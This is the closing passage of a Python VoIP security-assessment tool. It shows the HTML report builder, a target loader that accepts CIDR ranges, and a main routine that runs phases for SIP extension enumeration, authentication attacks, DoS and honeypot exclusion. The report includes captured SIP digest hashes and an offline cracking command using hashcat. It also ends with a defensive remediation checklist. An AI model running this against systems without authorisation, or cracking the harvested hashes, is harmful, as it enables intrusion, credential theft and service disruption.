    ext_html = " &nbsp; ".join(
        f"<code>{html_lib.escape(e)}</code>" for e in state.valid_extensions[:60])

    prov_rows = ""
    for p in state.provision_urls[:20]:
        prov_rows += (f"<tr><td>{html_lib.escape(p['ip'])}</td>"
                      f"<td>{html_lib.escape(p['path'])}</td>"
                      f"<td>{html_lib.escape(str(p['status']))}</td></tr>\n")

    hash_list = "<br>".join(
        html_lib.escape(f"{h['ip']} {h.get('hash_line','')}")
        for h in state.digest_hashes[:20])

    honeypot_list = ", ".join(
        html_lib.escape(ip) for ip in sorted(state.honeypot_ips)[:20])

    h = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>VoIP Security Report — {datetime.now().strftime('%Y-%m-%d')}</title>
<style>
  *{{box-sizing:border-box}}
  body{{font-family:'Segoe UI',Arial,sans-serif;margin:0;background:#f1f5f9;color:#1e293b}}
  .hdr{{background:linear-gradient(135deg,#0f172a,#1e3a5f);color:#fff;padding:36px 48px}}
  h1{{margin:0 0 6px;font-size:26px}}
  h2{{color:#1e3a5f;margin:28px 0 12px;font-size:18px}}
  .stats{{display:flex;gap:14px;flex-wrap:wrap;margin:20px 0}}
  .card{{background:#fff;border-radius:12px;padding:24px;margin:16px 0;
          box-shadow:0 2px 8px rgba(0,0,0,.07)}}
  table{{width:100%;border-collapse:collapse;font-size:13px}}
  th{{background:#1e3a5f;color:#fff;padding:9px 12px;text-align:left;font-size:12px}}
  td{{padding:8px 12px;border-bottom:1px solid #e2e8f0;vertical-align:top}}
  tr:hover td{{background:#f8fafc}}
  .risk{{font-size:17px;font-weight:bold;padding:10px 18px;border-radius:8px;
           background:#fee2e2;color:#dc2626;display:inline-block;margin:10px 0}}
  input,select{{padding:7px;border:1px solid #cbd5e1;border-radius:6px;margin:8px 4px 8px 0}}
  input{{width:280px}}
  pre{{background:#0f172a;color:#e2e8f0;padding:16px;border-radius:8px;
       overflow:auto;font-size:12px}}
  .footer{{text-align:center;padding:28px;color:#64748b;font-size:12px}}
  code{{background:#f1f5f9;padding:1px 5px;border-radius:3px;font-size:12px}}
</style>
<script>
function ft(){{
  const q=document.getElementById('q').value.toLowerCase();
  const s=document.getElementById('sf').value;
  document.querySelectorAll('#ft tr:not(:first-child)').forEach(r=>{{
    const match=r.textContent.toLowerCase().includes(q)&&(!s||r.textContent.includes(s));
    r.style.display=match?'':'none';
  }});
}}
</script>
</head><body>
<div class="hdr">
  <h1>Enterprise VoIP Security Assessment Report</h1>
  <div style="opacity:.7;font-size:13px">Framework v{VERSION} &nbsp;|&nbsp;
    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp;
    Scan duration: {elapsed:.0f}s</div>
</div>
<div style="padding:0 48px 48px">
  <h2>Assessment Overview</h2>
  <div class="stats">{stat_cards}</div>
  <div class="risk">Overall Risk: {html_lib.escape(risk_level)}</div>

  <div class="card">
    <h2>Vulnerability Findings ({len(state.cve_findings)})</h2>
    <input id="q" placeholder="Search …" oninput="ft()">
    <select id="sf" onchange="ft()">
      <option value="">All Severities</option>
      <option>CRITICAL</option><option>HIGH</option><option>MEDIUM</option>
      <option>LOW</option><option>EXPOSURE</option><option>CREDENTIAL</option>
      <option>AUTH-BYPASS</option><option>INJECTION</option><option>FUZZING</option>
    </select>
    <table id="ft">
      <tr><th>IP</th><th>CVE / ID</th><th>Title</th><th>Severity</th>
          <th>Description</th><th>URL</th><th>Timestamp</th></tr>
      {rows}
    </table>
  </div>

  <div class="card">
    <h2>Service Fingerprints</h2>
    <table><tr><th>IP</th><th>Vendor</th><th>SIP Banner</th><th>Open Ports</th></tr>
    {fp_rows}</table>
  </div>

  <div class="card">
    <h2>Discovered Extensions ({len(state.valid_extensions)})</h2>
    <p style="font-size:13px">{ext_html or 'None found'}</p>
  </div>

  <div class="card">
    <h2>Phone Provisioning Findings ({len(state.provision_urls)})</h2>
    <table><tr><th>IP</th><th>Path</th><th>Status</th></tr>{prov_rows}</table>
  </div>

  <div class="card">
    <h2>SIP Digest Challenges Captured</h2>
    <p style="color:#dc2626;font-size:13px">
      Crack offline: <code>hashcat -m 11400 results/digest_hashes.txt wordlist.txt</code>
    </p>
    <pre>{hash_list or 'None captured'}</pre>
  </div>

  {'<div class="card"><h2>Honeypots Excluded (' + str(len(state.honeypot_ips)) + ')</h2><p style="font-size:13px;color:#7c3aed">' + (honeypot_list or 'None') + '</p></div>' if state.honeypot_ips else ''}

  <div class="card">
    <h2>Remediation Checklist</h2>
    <ul style="line-height:2.2;font-size:14px">
      <li>Patch all CRITICAL vulnerabilities within 24 hours</li>
      <li>Disable anonymous SIP REGISTER immediately</li>
      <li>Enable fail2ban with aggressive SIP rules (maxretry=3, bantime=3600)</li>
      <li>Enforce TLS 1.2+ on all SIP signaling</li>
      <li>Mandate SRTP (AES-256-GCM) for all media streams</li>
      <li>Change all default credentials on every interface</li>
      <li>Restrict AMI (5038) and ARI (8088) to 127.0.0.1 only</li>
      <li>Implement STIR/SHAKEN caller-ID verification (RFC 8226)</li>
      <li>Segment VoIP VLAN — no lateral movement to corporate LAN</li>
      <li>Disable IAX2 if not required — or enforce HMAC-MD5</li>
      <li>Restrict TFTP to provisioning VLAN only</li>
      <li>Enable SNMP v3 AuthPriv — remove community strings</li>
      <li>SIP Digest: SHA-256 + qop=auth-int (RFC 7616)</li>
      <li>Schedule quarterly penetration testing</li>
    </ul>
  </div>
</div>
<div class="footer">
  Enterprise VoIP Security Framework v{VERSION} — Confidential
</div></body></html>"""
    (rd/"voip_report.html").write_text(h,encoding="utf-8")
    Con.ok(f"HTML report: {rd}/voip_report.html")

# ══════════════════════════════════════════════════════════
# LOAD TARGETS  (supports CIDR notation)
# ══════════════════════════════════════════════════════════
def load_targets(path:str) -> List[str]:
    out: List[str] = []
    seen: Set[str] = set()

    def _add(ip: str):
        if ip not in seen:
            seen.add(ip)
            out.append(ip)

    try:
        with open(path,encoding="utf-8",errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # CIDR notation (e.g., 192.168.1.0/24)
                if "/" in line:
                    try:
                        net = ipaddress.ip_network(line, strict=False)
                        # Skip huge networks to avoid memory issues
                        if net.num_addresses <= 65536:
                            for addr in net.hosts():
                                _add(str(addr))
                        else:
                            Con.warn(f"Skipping large CIDR {line} "
                                     f"({net.num_addresses} addresses — use /16 or smaller)")
                    except ValueError:
                        pass
                    continue
                # Plain IP
                if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', line):
                    _add(line)
                    continue
                # Hostname
                if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', line):
                    _add(line)
        Con.ok(f"Loaded {col(str(len(out)),'white')} targets from {path}")
    except FileNotFoundError:
        Con.err(f"Target file not found: {path}")
    return out

# ══════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════
async def run(input_file:str, cdr_file:str):
    global _log_file_handle
    LOG_DIR.mkdir(parents=True,exist_ok=True)
    RESULTS_DIR.mkdir(parents=True,exist_ok=True)
    log_path = LOG_DIR/f"voip_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    _log_file_handle = open(log_path,"w",encoding="utf-8")

    Con.banner()
    Con.stat_line("Input file",      input_file)
    Con.stat_line("CDR file",        cdr_file)
    Con.stat_line("Concurrency",     f"{THREADS} threads")
    Con.stat_line("Timeout",         f"{TIMEOUT}s per probe")
    Con.stat_line("Batch size",      f"{BATCH_SIZE} hosts/wave")
    Con.stat_line("aiohttp",         "yes ✓" if HAS_AIOHTTP else "no (urllib fallback)")
    Con.stat_line("CVEs in database",str(len(CVE_DB)))
    Con.stat_line("Protocols",       "SIP · RTP · IAX2 · MGCP · SCCP · H.323 · STUN/TURN · TFTP")
    print()

    targets = load_targets(input_file)
    state   = State()

    # Phase-specific semaphores for optimal concurrency tuning
    sem_disc = asyncio.Semaphore(SEM_DISCOVERY)
    sem_fp   = asyncio.Semaphore(SEM_FINGERPRINT)
    sem_cve  = asyncio.Semaphore(SEM_CVE)
    sem_sip  = asyncio.Semaphore(SEM_SIP)
    sem_ext  = asyncio.Semaphore(SEM_EXTENSION)
    sem_rtp  = asyncio.Semaphore(SEM_RTP)
    sem_stun = asyncio.Semaphore(SEM_STUN)
    sem_iax  = asyncio.Semaphore(SEM_IAX2)
    sem_leg  = asyncio.Semaphore(SEM_LEGACY)
    sem_tftp = asyncio.Semaphore(SEM_TFTP)
    sem_auth = asyncio.Semaphore(SEM_AUTH)
    sem_dos  = asyncio.Semaphore(SEM_DOS)
    sem_mgmt = asyncio.Semaphore(SEM_MGMT)
    sem_vend = asyncio.Semaphore(SEM_VENDOR)

    sess = new_session()

    try:
        await phase1_discovery(targets, state, sem_disc)
        await phase1b_honeypot(state, sem_fp)
        await phase2_fingerprint(state, sess, sem_fp)
        await phase3_cve(state, sess, sem_cve)
        await phase4_sip(state, sem_sip)
        await phase5_extensions(state, sem_ext)
        await phase6_rtp(state, sem_rtp)
        await phase7_stun_turn(state, sem_stun)
        await phase8_iax2(state, sem_iax)
        await phase9_mgcp_sccp_h323(state, sem_leg)
        await phase10_tftp(state, sess, sem_tftp)
        await phase11_auth(state, sess, sem_auth)
        await phase12_dos(state, sem_dos)
        await phase13_snmp_mgmt(state, sess, sem_mgmt)
        await phase14_vendor(state, sess, sem_vend)
    finally:
        if sess and HAS_AIOHTTP:
            await sess.close()

    phase15_cdr(cdr_file, RESULTS_DIR)
    phase16_report(state, input_file, RESULTS_DIR)
    state.save(RESULTS_DIR)

    elapsed = time.monotonic()-state.scan_start
    Con.phase("ASSESSMENT COMPLETE")
    Con.stat_line("Total elapsed",     f"{elapsed:.0f}s")
    Con.stat_line("Live hosts",        len(state.live_ips))
    Con.stat_line("Honeypots excluded",len(state.honeypot_ips))
    Con.stat_line("Total findings",    len(state.cve_findings))
    Con.stat_line("CRITICAL",          col(str(state.stats.get("CRITICAL",0)),"red"))
    Con.stat_line("HIGH",              col(str(state.stats.get("HIGH",0)),"orange"))
    Con.stat_line("MEDIUM",            col(str(state.stats.get("MEDIUM",0)),"yellow"))
    Con.stat_line("Extensions found",  len(state.valid_extensions))
    Con.stat_line("Digest hashes",     len(state.digest_hashes))
    print()
    Con.ok(f"Results: {col(str(RESULTS_DIR.resolve()),'cyan')}")
    Con.ok(f"HTML report: {col('results/voip_report.html','cyan')}")
    Con.ok(f"Log file: {col(str(log_path),'gray')}")
    print()

    if _log_file_handle:
        try: _log_file_handle.close()
        except: pass


def main():
    input_file = (sys.argv[1] if len(sys.argv)>=2 and sys.argv[1]
                  else ("targets.txt" if Path("targets.txt").exists() else "targets.txt"))
    cdr_file   = sys.argv[2] if len(sys.argv)>=3 else "asterisk_cdr.csv"

    def _sig(s,f):
        print(f"\n{col('[!] Interrupted — partial results saved to ./results/','yellow')}")
        sys.exit(130)
    signal.signal(signal.SIGINT,_sig)

    asyncio.run(run(input_file, cdr_file))


if __name__=="__main__":
    main()
